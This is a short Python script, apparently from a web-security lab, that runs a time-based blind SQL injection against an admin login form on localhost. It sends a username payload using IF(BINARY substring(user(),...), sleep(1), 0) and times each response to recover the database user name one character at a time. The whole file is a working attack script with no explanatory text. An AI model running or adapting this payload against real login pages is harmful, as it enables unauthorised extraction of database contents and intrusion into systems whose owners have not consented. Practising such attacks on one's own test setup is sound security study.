import sys
from tracemalloc import start
import requests
import time

url = 'http://localhost/web_security/blog/admin_login.php'

for i in range(1, 20):
    for c in range(0x20, 0x7f):
        username = "xyz' OR IF(BINARY substring(user(), %d, 1) = '%s', sleep(1), 0) -- " % (i, chr(c))
        
        password = "12345"

        form = {'username': username, 'password': password, 'submit': 'Login'}

        start = time.time()

        response = requests.post(url, data=form)

        end = time.time()

        selisih = end - start
        if selisih >= 1.0:
            sys.stdout.write(chr(c))
            sys.stdout.flush()
            break

print('')